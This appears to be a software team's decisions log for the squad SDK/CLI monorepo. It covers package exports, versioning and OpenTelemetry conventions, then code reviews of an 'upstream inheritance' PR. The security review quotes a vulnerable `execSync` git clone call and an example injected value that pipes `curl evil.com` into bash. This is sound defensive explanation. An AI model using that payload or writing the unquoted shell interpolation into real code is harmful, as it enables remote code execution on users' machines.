**Key Call — SDK Barrel Cleanup:** Remove CLI utilities (`success`, `error`, `warn`, `fatal`, etc.) from SDK exports. CLI re-exports in `src/index.ts` were a mistake — those are CLI implementation details, not SDK API. This is a breaking change that's correct and intentional.

**Import Rewriting Rules:**
- CLI → SDK relative imports become package imports (`from '../config/'` → `from '@bradygaster/squad-sdk/config'`)
- Intra-SDK and intra-CLI imports stay relative (unchanged)

### 2026-02-22: CharterCompiler reuses parseCharterMarkdown — no duplicate parsing

**By:** Edie

**What:** `CharterCompiler.compile()` delegates to the existing `parseCharterMarkdown()` function from `charter-compiler.ts` rather than implementing its own markdown parser. The legacy class is a thin filesystem wrapper around the already-tested parsing logic.

**Why:** Single source of truth for charter parsing. The `parseCharterMarkdown` function already handles all `## Identity` and `## Model` field extraction with tested regex patterns. Duplicating that logic would create drift risk.

### 2026-02-22: AgentSessionManager uses optional EventBus injection

**By:** Edie

**What:** `AgentSessionManager` constructor accepts an optional `EventBus` parameter. When present, `spawn()` emits `session.created` and `destroy()` emits `session.destroyed`. When absent, the manager works silently (no events).

**Why:** Keeps the manager testable without requiring a full event bus setup. Coordinator can wire the bus when available; unit tests can omit it.

### 2026-02-22: Ink Shell Wiring — ShellApi callback pattern

**By:** Fenster

**Date:** 2026-02-22

**Status:** Implemented

**Context:** The shell needed to move from a readline echo loop to an Ink-based UI using the three existing components (AgentPanel, MessageStream, InputPrompt). The key challenge was connecting the StreamBridge (which pushes events from the streaming pipeline) into React component state.

**Decision:** **ShellApi callback pattern:** The `App` component accepts an `onReady` prop that fires once on mount, delivering a `ShellApi` object with three methods: `addMessage`, `setStreamingContent`, `refreshAgents`. The host (`runShell()`) captures this API and wires it to StreamBridge callbacks.

This keeps the Ink component decoupled from StreamBridge internals — the component doesn't import or know about the bridge. The host is the only place where both meet.

**`React.createElement` in index.ts:** Rather than renaming `index.ts` to `index.tsx` (which would ripple through exports maps and imports), `runShell()` uses `React.createElement(App, props)` directly. This keeps the file extension stable.

**Streaming content accumulation:** StreamBridge's `onContent` callback delivers deltas. The host maintains a `streamBuffers` Map to accumulate content per agent and pushes the full accumulated string to `setStreamingContent`. On `onComplete`, the buffer is cleared and the final message is added.

**Consequences:** StreamBridge is ready for coordinator wiring — call `_bridge.handleEvent(event)` when the coordinator emits streaming events. Direct agent messages and coordinator routing show placeholders until coordinator integration (Phase 3). All existing exports from `shell/index.ts` are preserved. New exports: `App`, `ShellApi`, `AppProps`.

### 2026-02-22: Runtime EventBus as canonical bus for orchestration classes

**By:** Fortier

**Date:** 2026-02-22

**Scope:** Coordinator, Ralph, and future orchestration components

**Decision:** The `runtime/event-bus.ts` (colon-notation: `session:created`, `subscribe()` API, built-in error isolation via `executeHandler()`) is the canonical EventBus for all orchestration classes. The `client/event-bus.ts` (dot-notation: `session.created`, `on()` API) remains for backward-compat but should not be used in new code.

**Rationale:**
- Runtime EventBus has proper error isolation — one handler failure doesn't crash others
- SquadCoordinator (M3-1) tests already use RuntimeEventBus
- Consistent API surface (`subscribe`/`subscribeAll`/`unsubscribe`) is cleaner than `on`/`onAny`
- Event type strings use colon-notation which avoids ambiguity with property access patterns

**Impact:**
- Coordinator and RalphMonitor now import from `../runtime/event-bus.js`
- All new EventBus consumers should follow this pattern
- Client EventBus remains exported for external consumers

### 2026-02-22: Runtime Module Test Patterns

**By:** Hockney (Tester)

**Date:** 2026-02-22

**Status:** Adopted

**Context:** Writing proactive tests for runtime modules (CharterCompiler, AgentSessionManager, Coordinator, RalphMonitor) being built in parallel by multiple team members.

**Decisions:**

1. **Two EventBus APIs require different mocks.** The client EventBus uses `on()`/`emit()` while the runtime EventBus uses `subscribe()`/`emit()`. Tests must use the correct mock depending on which bus the module under test consumes. AgentSessionManager uses the client bus (`on`); Coordinator uses the runtime bus (`subscribe`).

2. **CharterCompiler tests use real test-fixtures.** Instead of mocking the filesystem, we read from `test-fixtures/.squad/agents/` for `compile()` and `compileAll()` tests. This gives integration-level confidence. Only `parseCharterMarkdown` uses inline string fixtures for unit isolation.

3. **Coordinator routing priority is: direct > @mention > team keyword > default.** Tests explicitly verify this ordering. Any change to routing logic must preserve this priority chain.

4. **RalphMonitor tests are future-proof stubs.** Since Ralph is mostly TODO stubs, tests validate current behavior (empty arrays, no-throw lifecycle) and will automatically exercise real logic once implemented — no test changes needed.

**Impact:**
- 105 new tests across 4 files, all passing
- Test count: 1727 → 1832 across 61 files
- No circular dependencies verified (clean DAG)

**Migration Order:**
1. **Phase 1 (SDK first):** Copy 15 dirs + 4 files, update exports, build in isolation
2. **Phase 2 (CLI second):** Copy cli/ + cli-entry.ts, rewrite imports to SDK packages, build against SDK
3. **Phase 3 (root cleanup):** Delete root src/, update test imports, finalize structure

**Templates:** Copy into CLI package (Option A — self-contained packages).

**Why:** One-way dependency graphs enable independent package evolution. SDK stays pure library; CLI stays thin consumer. Future features only touch the relevant package.

### 2026-02-22: Version Alignment — 0.7.0 stubs → 0.8.0 real packages
**By:** Kobayashi (Git & Release)
**Status:** APPROVED & EXECUTED

**Context:**
- **0.7.0 npm stubs:** Placeholder packages published on npmjs.com (no real code)
- **Goal:** Publish real, working code under new version

**Decision: Bump to 0.8.0**
- **Rationale:** Clear break from stubs (0.7.0 is placeholder; 0.8.0 is functional code). Pre-1.0 signal appropriate for alpha software.

**Changes Executed:**
1. SDK `package.json`: version `0.7.0` → `0.8.0`
2. CLI `package.json`: version `0.7.0` → `0.8.0`, SDK dependency locked to `@bradygaster/squad-sdk@0.8.0`
3. SDK `src/index.ts`: `VERSION` export `0.7.0` → `0.8.0`
4. Root `package.json`: added `"private": true` (prevent accidental npm publish of workspace coordinator)

**Verification:** ✅ All version strings aligned, CLI dependency on SDK pinned, root marked private.

### 2026-02-22: Defer test import migration until root src/ removal
**By:** Hockney (Tester)
**Status:** Proposed

**Context:** After SDK/CLI workspace split, all 56 test files still import from root `../src/`. Build and all 1719 tests pass cleanly because root `src/` still exists.

**Decision:** Defer migrating test imports from `../src/` to `@bradygaster/squad-sdk` / `@bradygaster/squad-cli` until root `src/` is actually removed.

**Rationale:**
1. **Exports map gap:** SDK exposes 18 subpath exports; tests import ~40+ distinct deep internal paths not in exports map
2. **CLI no exports:** cli/shell/ tests have no package-level export path to migrate to
3. **Barrel divergence:** Root `src/index.ts` still exports CLI functions SDK package correctly does not
4. **Risk/reward:** 150+ import lines for zero functional benefit while root `src/` exists is pure risk

**When to revisit:** When root `src/` is deleted (blocker at that point). Options: expand exports maps, add vitest resolve.alias, or move tests into workspace packages.

### 2026-02-22: Build System Migration — tsconfig + package.json
**By:** Edie (TypeScript Engineer)
**Status:** Decision
**Scope:** Monorepo build configuration for SDK/CLI workspace packages

**What Changed:**
1. **Root tsconfig.json:** Base config only, shared compiler options, `files: []` (compiles nothing), project references to both packages
2. **SDK tsconfig.json:** Extends root, `composite: true`, declarations + maps, no JSX
3. **CLI tsconfig.json:** Extends root, `composite: true`, `jsx: "react-jsx"`, references SDK package
4. **Root package.json:** `private: true`, workspace orchestrator, stripped main/types/bin/runtime deps
5. **SDK package.json:** 18 subpath exports, `@github/copilot-sdk` as direct dependency
6. **CLI package.json:** `bin.squad` → `./dist/cli-entry.js`, ink/react runtime deps, templates in files array

**Why `composite: true`:** TypeScript project references require this. Without it, cross-package type information fails to resolve.

**Build Order:** `npm run build --workspaces` builds SDK first (no deps), then CLI (depends on SDK). npm respects topological order automatically.

**Verified:** Both packages compile with zero errors. All dist artifacts (`.js`, `.d.ts`, `.d.ts.map`) emitted correctly.

### 2026-02-22: Subpath exports in @bradygaster/squad-sdk
**By:** Edie (TypeScript Engineer)
**Issue:** #227

**What:** `packages/squad-sdk/package.json` declares 18 subpath exports (`.`, `./parsers`, `./types`, and 15 module paths). Each uses types-first condition ordering.

**Why:** Enables tree-shaking and focused imports. Consumers can `import { … } from '@bradygaster/squad-sdk/config'` instead of pulling the entire barrel. Type-only consumers can import from `./types` with zero runtime cost.

**Constraints:**
- Every subpath must have a corresponding source barrel (`src/<path>.ts` or `src/<path>/index.ts`)
- `"types"` condition must appear before `"import"` — Node.js evaluates top-to-bottom
- ESM-only: no `"require"` condition per team decision
- Adding a new subpath requires both source barrel and exports entry; removing one without the other breaks resolution

### 2026-02-22: Barrel file conventions for parsers and types
**By:** Kujan (SDK Expert)
**Issues:** #225, #226 (Epic #181)

**What:**
- `src/parsers.ts` re-exports all parser functions AND their types using `export { ... } from` and `export type { ... } from`
- `src/types.ts` re-exports ONLY types using `export type { ... } from` exclusively — guaranteed zero runtime imports
- Both follow the existing ESM barrel pattern from `src/index.ts`

**Why:**
1. **Consumer convenience:** SquadUI and others can import parsers or types from a single module instead of reaching into internal paths
2. **Separation of concerns:** `types.ts` is safe for type-only contexts (declaration files). `parsers.ts` includes runtime functions for consumers that need them
3. **No existing modifications:** Both are additive-only new files — zero risk to existing behavior

**Impact:** Low. Two new files, no changes to existing source. Build passes, all 1683 tests pass.

### 2026-02-22: Use npm-native workspace resolution (not pnpm `workspace:*`)
**By:** Edie (TypeScript Engineer)
**Date:** 2026-02-22
**Status:** Applied

**Context:** Brady's task requested using `workspace:*` for the CLI→SDK dependency. However, this project uses npm workspaces (not pnpm or Yarn). The `workspace:` protocol is a pnpm/Yarn feature and npm rejects it with `EUNSUPPORTEDPROTOCOL`.

**Decision:** Use `"*"` as the version specifier instead. Under npm workspaces, when a dependency name matches a local workspace package, npm automatically resolves to the local package regardless of the version specifier. `"*"` accepts any version, ensuring the local SDK is always used during development.

**Trade-off:** `"*"` will be published as-is to npm (unlike pnpm's `workspace:*` which gets replaced with the real version at publish time). Before publishing the CLI package, the SDK dependency version should be pinned to the actual release version. A `prepublishOnly` script or CI step could automate this.

### 2026-02-22: Test import migration to workspace packages
**By:** Fenster (Core Dev)
**Date:** 2026-02-22
**Status:** Implemented

**Context:** All 56 test files imported from root `src/` via relative paths (`../src/...`). With the SDK/CLI workspace split, tests needed to import from `@bradygaster/squad-sdk` and `@bradygaster/squad-cli` packages instead.

**Decision:**
1. **Barrel-first imports:** Where a barrel/index file re-exports symbols from sub-modules, tests import from the barrel path (e.g., `@bradygaster/squad-sdk/config` instead of individual files).
2. **New subpath exports for orphaned modules:** 8 runtime/adapter modules not covered by existing barrels got new subpath exports in the SDK package.json.
3. **Missing barrel re-exports fixed:** `selectResponseTier`/`getTier` added to coordinator barrel; `onboardAgent`/`addAgentToConfig` added to agents barrel.
4. **CLI functions correctly located:** Consumer imports test updated to import CLI functions from `@bradygaster/squad-cli` (not SDK), reflecting intentional separation.

**Consequence:** Zero `grep -r "from '../src/" test/` results. All 1727 tests pass. SDK has 26 subpath exports, CLI has 17.

### 2026-02-22: CI/CD & Release Readiness Assessment
**By:** Kobayashi (Git & Release)
**Date:** 2026-02-22
**Status:** ASSESSMENT COMPLETE

**Summary:** All 13 CI/CD workflows are production-ready and correctly configured. Merge drivers are in place. Branch protection is working. Publishing infrastructure works both for stable releases (v* tags) and pre-releases (insider branch).

**Version Status:**
- SDK `package.json`: 0.8.0
- CLI `package.json`: 0.8.1 (intentional patch for bin entry fix)
- CHANGELOG: 0.6.0-alpha.0 (root workspace marker)

**Workflow Audit:**
- ✅ Core CI validates on PR/push to main, dev, insider
- ✅ squad-publish.yml: Publishes both packages on v* tags with public access
- ✅ squad-insider-publish.yml: Auto-publishes on insider push with `--tag insider`
- ✅ Release/promote workflows fully functional

**Merge Drivers:** Union merge configured for append-only files (decisions.md, agents/*/history.md, log/**, orchestration-log/**).

**Release Readiness:** Insider channel ready now. Stable release ready after version alignment if desired.

**Recommendation:** Version alignment (SDK 0.8.0, CLI 0.8.0) simplifies CHANGELOG during pre-1.0. Separate versioning can be deferred post-1.0 if needed.

### 2026-02-22: Fix npx bin resolution for squad-cli
**By:** Rabin (Distribution)
**Date:** 2026-02-22
**Status:** Implemented & Published

**Context:** `npx @bradygaster/squad-cli@0.8.0` printed placeholder text instead of running the real CLI. The bin entry was `"squad": "./dist/cli-entry.js"` but npx resolves by unscoped package name (`squad-cli`), not by custom bin names.

**Decision:**
1. Added `"squad-cli"` as second bin entry pointing to `./dist/cli-entry.js`
2. Replaced orphaned placeholder `dist/cli.js` with redirect to `cli-entry.js`
3. Bumped version to 0.8.1 (0.8.0 immutable on npm)
4. Published @bradygaster/squad-cli@0.8.1 to npm

**Consequence:**
- `npx @bradygaster/squad-cli` now runs the real CLI
- `squad` command still works for global installs
- Both bin names resolve to the same entry point
- Future releases must keep both bin entries




### OpenTelemetry version alignment: pin core packages to 1.30.x line
**By:** Edie
**Issue:** #254
**What:** All OTel optional dependencies in `packages/squad-sdk/package.json` must stay version-aligned: `sdk-node@^0.57.x` requires `sdk-trace-base@^1.30.0`, `sdk-trace-node@^1.30.0`, `sdk-metrics@^1.30.0`, `resources@^1.30.0`. These must be explicit optional dependencies, not left to transitive resolution.
**Why:** Without explicit pins, npm hoists the latest versions (2.x) of `sdk-trace-base`, `sdk-metrics`, and `resources` to the top-level `node_modules`. The 2.x types are structurally incompatible with the 1.x types that `sdk-node@0.57.x` transitively depends on, causing TS2345/TS2741 type errors (e.g., missing `instrumentationScope` on `ReadableSpan`, missing `getRawAttributes` on `Resource`). Explicit pins at `^1.30.0` force npm to deduplicate on the 1.x line, eliminating the type conflicts.


# Decision: OpenTelemetry Tracing for Agent Lifecycle & Coordinator Routing

**Date:** 2026-02-22  
**By:** Fenster  
**Issues:** #257, #258  
**Status:** Implemented

## What

Added OpenTelemetry trace instrumentation to four files in `packages/squad-sdk/src/`:

1. **`agents/index.ts`** — AgentSessionManager: `spawn()`, `resume()`, `destroy()` wrapped with spans (`squad.agent.spawn`, `squad.agent.resume`, `squad.agent.destroy`).
2. **`agents/lifecycle.ts`** — AgentLifecycleManager: `spawnAgent()`, `destroyAgent()` wrapped with spans (`squad.lifecycle.spawnAgent`, `squad.lifecycle.destroyAgent`).
3. **`coordinator/index.ts`** — Coordinator: `initialize()`, `route()`, `execute()`, `shutdown()` wrapped with spans (`squad.coordinator.initialize`, `squad.coordinator.route`, `squad.coordinator.execute`, `squad.coordinator.shutdown`).
4. **`coordinator/coordinator.ts`** — SquadCoordinator: `handleMessage()` wrapped with span (`squad.coordinator.handleMessage`).

## Why

- Observability is foundational for debugging multi-agent orchestration at runtime.
- Using `@opentelemetry/api` only — no-ops without a registered provider, so zero cost in production unless OTel is configured.
- Trace hierarchy: `coordinator.handleMessage → coordinator.route → coordinator.execute → lifecycle.spawnAgent → agent.spawn`.

## Convention Established

- **Tracer name:** `trace.getTracer('squad-sdk')` — one tracer per package.
- **Span naming:** `squad.{module}.{method}` (e.g., `squad.agent.spawn`).
- **Attributes:** Use descriptive keys like `agent.name`, `routing.tier`, `target.agents`, `spawn.mode`.
- **Error handling:** `span.setStatus({ code: SpanStatusCode.ERROR })` + `span.recordException(err)` in catch blocks. Always `span.end()` in `finally`.
- **Import only from `@opentelemetry/api`** — never from SDK packages directly.


# Decision: OTel Foundation — NodeSDK over individual providers

**Author:** Fortier (Node.js Runtime)
**Date:** 2026-02-22
**Issues:** #255, #256
**Status:** Implemented

## Context

Issues #255 and #256 require OTel provider initialization and a bridge from the existing TelemetryCollector to OTel spans. The OpenTelemetry JS ecosystem has multiple packages (`sdk-trace-base`, `sdk-trace-node`, `sdk-metrics`, `resources`, `exporter-*`) that frequently ship with incompatible transitive versions, causing TypeScript type errors even when runtime behavior is correct.

## Decision

Use `@opentelemetry/sdk-node`'s `NodeSDK` class as the single provider manager, and import `Resource` and `PeriodicExportingMetricReader` from its re-exports (`resources`, `metrics` sub-modules) rather than installing them as direct dependencies.

Direct deps added to `packages/squad-sdk`:
- `@opentelemetry/api`
- `@opentelemetry/sdk-node`
- `@opentelemetry/exporter-trace-otlp-http`
- `@opentelemetry/exporter-metrics-otlp-http`
- `@opentelemetry/semantic-conventions`

NOT added (bundled via `sdk-node`):
- `@opentelemetry/sdk-trace-base`
- `@opentelemetry/sdk-trace-node`
- `@opentelemetry/sdk-metrics`
- `@opentelemetry/resources`

## Consequences

- Single `_sdk.shutdown()` handles both tracing and metrics cleanup.
- No version skew between trace and metric providers.
- `getTracer()` / `getMeter()` return no-op instances when OTel is not initialized — zero overhead in the default case.
- The bridge (`otel-bridge.ts`) is additive — it produces a `TelemetryTransport` that can be registered alongside any existing transport.

## Files Changed

- `packages/squad-sdk/src/runtime/otel.ts` — Provider initialization module
- `packages/squad-sdk/src/runtime/otel-bridge.ts` — TelemetryCollector → OTel span bridge
- `packages/squad-sdk/src/index.ts` — Barrel exports for both modules
- `packages/squad-sdk/package.json` — Dependencies + subpath exports



### Decision: StreamingPipeline.markMessageStart() as explicit latency tracking entry point

**By:** Fortier (Node.js Runtime)
**Date:** 2026-02-22
**Issues:** #259, #264

**What:** Latency metrics (TTFT, response duration, tokens/sec) in StreamingPipeline require an explicit `markMessageStart(sessionId)` call before sending a message. This opts callers into latency tracking rather than making it automatic.

**Why:** The pipeline doesn't own the send call — it only sees events after they arrive. Without a start timestamp, TTFT and duration are meaningless. Making it explicit avoids hidden coupling between the pipeline and SquadClient.sendMessage(), and means callers who don't need latency metrics (e.g. tests, offline replay) pay zero overhead.

**Pattern:** Call `pipeline.markMessageStart(sessionId)` → send message → pipeline records TTFT on first `message_delta` with `index === 0`, records duration + tokens/sec when `usage` event arrives. Tracking state auto-cleans after usage event or `clear()`.

**Also:** SquadClient now exposes `sendMessage(session, options)` with `squad.session.message` + child `squad.session.stream` OTel spans, and `closeSession(sessionId)` as a traced alias for `deleteSession`.


### 2026-02-22: Tool trace enhancements + agent metric wiring conventions

**By:** Fenster
**What:** Established patterns for OTel tool span attributes and agent metric wiring:

1. **`sanitizeArgs()`** strips fields matching `/token|secret|password|key|auth/i` before recording as span attributes. Truncates to 1024 chars. Exported from `tools/index.ts` for reuse.
2. **`defineTool` accepts optional `agentName`** in config — recorded as `agent.name` span attribute when present. Does not change the handler signature.
3. **`result.length`** attribute added to `squad.tool.result` events — measures `textResultForLlm` length.
4. **Agent metrics** (`recordAgentSpawn/Duration/Error/Destroy`) wired into both `AgentSessionManager` (index.ts) and `AgentLifecycleManager` (lifecycle.ts). Duration computed from `createdAt` in destroy path.
5. **Parent span propagation** deferred (TODO comment in `defineTool`) — will wire when agent.work span lifecycle is complete.

**Why:** Consistent instrumentation patterns prevent divergence between tool and agent telemetry. The sanitization approach is deliberately simple (field-name matching, not value inspection) to keep it fast and predictable. Agent metrics are wired at both abstraction levels (SessionManager + LifecycleManager) because they can be used independently.

# Decision: OTel Metric Wiring Pattern (#261, #263)

**Author:** Edie  
**Date:** 2026-02-22  
**Status:** Implemented  

## Context

Issues #261 and #263 required wiring pre-existing metric functions from `otel-metrics.ts` into the runtime (`StreamingPipeline`) and adapter (`SquadClient`).

## Decision

- **Token usage metrics** (`recordTokenUsage`) are recorded in `StreamingPipeline.processEvent()` AFTER dispatching to user-registered handlers. This ensures user handlers see the event before OTel instrumentation, and handler failures don't block metric recording.
- **Session pool metrics** are recorded at the innermost success/error boundary in `SquadClient`:
  - `recordSessionCreated()` after successful `client.createSession()` return
  - `recordSessionClosed()` after successful `client.deleteSession()` return
  - `recordSessionError()` at the top of inner catch blocks — recorded for EVERY failed attempt, including ones that trigger reconnection. This is intentional: a reconnect-eligible failure is still an error worth counting.
- No new exports needed — barrel and subpath exports were already wired in the Phase 1 otel-metrics scaffold.

## Rationale

Metric calls are no-ops when OTel is not configured (the meter returns no-op instruments), so this adds zero overhead for users without OTel. Recording errors before reconnect checks gives accurate failure counts without double-counting successes (the recursive retry gets its own `recordSessionCreated()` on success).


# Decision: OTel metrics test pattern — spy meter mock

**By:** Hockney (Tester)
**Date:** 2026-02-23
**Status:** Implemented

## What
OTel metrics tests use a spy-meter pattern: mock `getMeter()` to return a fake meter where every `createCounter`/`createHistogram`/`createUpDownCounter`/`createGauge` returns a spy instrument with `.add()` and `.record()` mocks. This allows verifying exact metric names, values, and attributes without a real OTel SDK or collector.

## Why
- The otel-metrics module is a thin instrumentation layer — tests need to verify *what* gets recorded, not *how* OTel processes it.
- Spy meter pattern avoids needing `InMemoryMetricExporter` (which has complex async flush semantics) and keeps tests synchronous and fast.
- Pattern is consistent with existing otel-bridge tests (spy spans via InMemorySpanExporter) but adapted for the metrics API surface.

## Applies to
- `test/otel-metrics.test.ts` (34 tests)
- `test/otel-metric-wiring.test.ts` (5 tests)
- Future OTel metric tests should follow this same pattern.

## 2026-02-22: Security Review: PR #300 — Upstream Inheritance

**By:** Baer (Security)
**Status:** 🛑 BLOCK — Critical finding must be resolved before merge

PR #300 introduces a significant trust boundary expansion. The feature design is sound, but the implementation has a **critical command injection vulnerability** and several high/medium issues that must be addressed.

### Finding 1: Command Injection via execSync — CRITICAL

**File:** `packages/squad-cli/src/cli/commands/upstream.ts`
**Lines:** ~122, ~186, ~189

The `ref` value from upstream.json is interpolated **unquoted** into shell commands:
```typescript
execSync(`git clone --depth 1 --branch ${ref} --single-branch "${source}" "${cloneDir}"`, ...)
```

A malicious upstream.json entry with `ref: "main; curl evil.com | bash"` executes arbitrary commands. The `source` value is in double quotes but shell double-quotes still allow `$(command)` substitution.

**Fix required:** Use `execFileSync('git', ['clone', '--depth', '1', '--branch', ref, ...])` instead of `execSync` with string interpolation. `execFileSync` bypasses the shell entirely, eliminating injection.

### Finding 2: Arbitrary Filesystem Read — HIGH

**File:** `packages/squad-sdk/src/upstream/resolver.ts`

For `type: 'local'`, the resolver reads from any filesystem path specified in `upstream.json` with zero validation. For `type: 'export'`, it reads and parses any JSON file at any path. Anyone with write access to `upstream.json` can cause the system to read from any local path on the developer's machine.

**Fix required:** Validate that local sources are absolute paths to directories that actually contain `.squad/` or `.ai-team/`. Consider requiring sources to be within a configurable allowlist or requiring explicit user confirmation on first use.

### Finding 3: Symlink Following — MEDIUM

**File:** `packages/squad-sdk/src/upstream/resolver.ts`

`fs.readFileSync` follows symlinks. A local upstream's `.squad/skills/evil/SKILL.md` could be a symlink to `/etc/passwd` or `~/.ssh/id_rsa`. The content would be read into memory and potentially injected into agent prompts.

**Fix recommended:** Use `fs.lstatSync` to check for symlinks before reading, or use `fs.realpathSync` and verify the resolved path stays within the upstream's root directory.

### Finding 4: No User Consent Model — MEDIUM

**Files:** `resolver.ts`, `upstream.ts`

There is no mechanism for a developer to review or approve what upstream sources will be read at session start. If upstream.json is committed to a repo and a developer clones it, the system silently reads from whatever paths are configured.

**Fix recommended:** On first session with a new upstream.json, display the configured sources and require explicit acknowledgment. Store consent in a local (gitignored) file.

### Findings 5-8

Findings 5 (Prompt Injection) — Medium, Finding 6 (Size Limits) — Low, Finding 7 (Git Credential) — Low, Finding 8 (JSON Prototype Pollution) — No Action.

### Required Actions Before Merge

1. **[CRITICAL]** Replace all `execSync` shell string interpolation with `execFileSync` array-based invocation
2. **[HIGH]** Add input validation for `ref` and `source`
3. **[MEDIUM]** Add symlink detection in resolver reads
4. **[MEDIUM]** Add security tests for injection, traversal, and symlink scenarios

**Verdict:** This PR must not merge until findings 1-4 are addressed. The command injection via execSync is CWE-78 (OS Command Injection) and is trivially exploitable by anyone who can edit upstream.json.

## 2026-02-22: Code Quality Review: PR #300 — Upstream Inheritance

**By:** Fenster (Core Dev)
**Status:** ⚠️ APPROVE WITH REQUIRED FIXES — 5 items before merge

Clean architecture, correct SDK/CLI separation, good test coverage. Five items must be fixed before merge.

### Finding 1: Wrong `fatal` function — BUG

**File:** `packages/squad-cli/src/cli/commands/upstream.ts:44`

The command imports `import { error as fatal }` from output.js, but all other CLI commands use `import { fatal } from ../core/errors.js` which throws SquadError. After a "fatal" error, execution continues to the next `if (action === ...)` block instead of stopping.

**Fix required:** Change import to `import { fatal } from '../core/errors.js';` and remove redundant `return;` statements after `fatal()` calls (since `fatal` returns `never`, TypeScript will enforce unreachable code).

### Finding 2: Command not registered in CLI router — MISSING

**File:** `packages/squad-cli/src/cli-entry.ts`

The `upstream` command is not wired into the CLI entry point. Users cannot invoke `squad upstream` — it's dead code. Every other command follows this pattern in cli-entry.ts.

**Fix required:** Add the route to `cli-entry.ts`.

### Finding 3: `execSync` command injection — CRITICAL (confirms Baer)

**File:** `packages/squad-cli/src/cli/commands/upstream.ts:148, 238, 242`

Baer already flagged this. Confirmed: the `ref` value is interpolated unquoted into shell command strings. Must use `execFileSync('git', [...args])` with array-based invocation.

### Finding 4: Test imports use relative source paths — CONVENTION VIOLATION

**Files:** `test/upstream.test.ts:11`, `test/upstream-e2e.test.ts:10-11`

Tests import from `../packages/squad-sdk/src/upstream/resolver.js` instead of `@bradygaster/squad-sdk/upstream`. This violates the test import migration decision (all 56 test files were migrated to package imports).

**Fix required:** Change to `import { resolveUpstreams, buildInheritedContextBlock, buildSessionDisplay } from '@bradygaster/squad-sdk/upstream';`

### Finding 5: `as any` cast in test — MINOR

**File:** `test/upstream-e2e.test.ts:861`

Uses `(org.castingPolicy as any).universe_allowlist`. Should use `as Record<string, unknown>` per strict-mode conventions.

### What's Good

- SDK/CLI separation is correct. Types and resolver in SDK, CLI command in CLI package.
- SDK barrel export follows existing pattern with `./upstream` subpath entry.
- `readUpstreamConfig` returns null (not throws), consistent with `readOptionalFile`/`readOptionalJson`.
- Type definitions are clean: `UpstreamType`, `UpstreamSource`, `UpstreamConfig`, `ResolvedUpstream`.
- Path handling uses `path.join`/`path.resolve` correctly.
- Test coverage is thorough: 14 unit tests + E2E hierarchy test.

### Required Actions (5)

1. **[BUG]** Fix `fatal` import from `errors.ts`, remove redundant `return` statements
2. **[MISSING]** Register `upstream` command in `cli-entry.ts`
3. **[CRITICAL]** Replace `execSync` with `execFileSync` array args
4. **[CONVENTION]** Fix test imports to use `@bradygaster/squad-sdk/upstream` package paths
5. **[MINOR]** Replace `as any` with `as Record<string, unknown>` in test

## 2026-02-22: Test Coverage Requirements: PR #300 Upstream Inheritance

**By:** Hockney (Tester)
**Status:** BLOCKED — Cannot review what doesn't exist

**Finding:** PR #300 does not exist. No pull request, branch, source files, or test files were found in the repository. All referenced artifacts are missing:
- `packages/squad-sdk/src/upstream/resolver.ts` — not found
- `packages/squad-cli/src/cli/commands/upstream.ts` — not found
- `test/upstream.test.ts`, `test/upstream-e2e.test.ts` — not found

**Test Coverage Requirements (for when PR materializes):**

### Unit Tests (resolver.ts — all 8 functions)
1. **readUpstreamConfig()** — happy path, null, malformed JSON, empty upstreams, missing fields
2. **findSquadDir()** — test `.squad/` primary and `.ai-team/` fallback
3. **readSkills()** — empty directory, no SKILL.md files, permission errors, valid skills
4. **resolveFromExport()** — valid export, invalid/corrupt export, missing file
5. **resolveUpstreams()** — all source types (local, git, export), mixed sources, one failure doesn't block others
6. **buildInheritedContextBlock()** — empty, single, multiple upstreams, deduplication
7. **buildSessionDisplay()** — empty, single, multiple upstreams

### CLI Command Tests (upstream.ts — 228 lines)
8. **squad upstream add** — valid local path, valid git URL, invalid path, duplicate add
9. **squad upstream remove** — existing entry, non-existent entry
10. **squad upstream list** — empty list, populated list, formatting
11. **squad upstream sync** — fresh sync, incremental sync, unreachable upstream

### Edge Cases (critical)
12. **Circular references** — repo A → B → A must not infinite loop
13. **Deep nesting** — 4+ level hierarchy must resolve transitively
14. **`.ai-team/` fallback** — legacy dir name must resolve
15. **Unicode/special chars in paths**
16. **Empty upstream.json** — valid JSON should not error
17. **Malformed entries** — missing required fields

### E2E Tests
18. **Transitive inheritance proof** — 3-level test asserts level-3 inherits from level-1
19. **Temp dir cleanup** — use pattern from resolution.test.ts

### Minimum Counts
- Unit tests: ≥20
- E2E tests: ≥5
- CLI tests: ≥12 (currently 0 — this is a blocking gap)

**Verdict:** BLOCKED. When the PR appears, apply these requirements as the acceptance gate.

## 2026-02-22: Architecture Review: PR #300 — Upstream Inheritance

**By:** Keaton (Lead)
**Status:** REQUEST CHANGES

The upstream inheritance concept is **architecturally sound** — the Org → Team → Repo hierarchy is a real need, the module boundaries are correct (SDK types + resolver, CLI commands), and `.squad/upstream.json` is the right config location. But several issues must be resolved before this merges.

### Required Changes (blocking)

#### 1. Proposal-first workflow violation

Team decision: "Meaningful changes require a proposal in `docs/proposals/` before execution." This is a +1056 line PR adding a new top-level SDK module. No proposal exists. Write the proposal — even retroactively. It forces articulation of scope boundaries, especially how upstream interacts with the coordinator and the existing sharing/export system.

#### 2. Type safety — `castingPolicy: Record<string, unknown>` is unacceptable

Team decision (Edie): strict mode, no loose types. The casting module exports `CastingConfig`, `CastingEntry`, and `CastingUniverse` — real types with real contracts. Using `Record<string, unknown>` for `castingPolicy` in `ResolvedUpstream` breaks the type chain. Import and use the actual casting types.

#### 3. Missing sanitization on inherited content

The existing `sharing/export.ts` sanitizes all outgoing content against `SECRET_PATTERNS`. The upstream resolver reads skills, decisions, wisdom, casting policy, and routing from external repos and injects them into the runtime context. There is no sanitization pass. An upstream repo that accidentally contains a leaked secret would propagate it into every downstream repo's session context. Add sanitization — reuse the existing `SECRET_PATTERNS` from the sharing module.

#### 4. `findSquadDir()` checking `.ai-team/` — resolve the ambiguity

The resolver checks both `.squad/` and `.ai-team/` as valid upstream directories. This creates permanent dual-format support without a documented deprecation path. Either: (a) document that `.ai-team/` is legacy and will be removed with a console warning, or (b) make the fallback order explicit and tested. Don't silently support two directory names forever.

### Strongly Recommended (non-blocking but expected before v1)

#### 5. Coordinator integration path

The PR provides `buildInheritedContextBlock()` and `buildSessionDisplay()` but doesn't wire them into the coordinator. Currently `SquadCoordinator.handleMessage()` uses `SquadConfig` — there's no hook to inject upstream-inherited context into the routing or prompt pipeline. File an issue for the integration point. Without it, the module is library code with no runtime consumer.

#### 6. Live local upstreams — document the trade-off

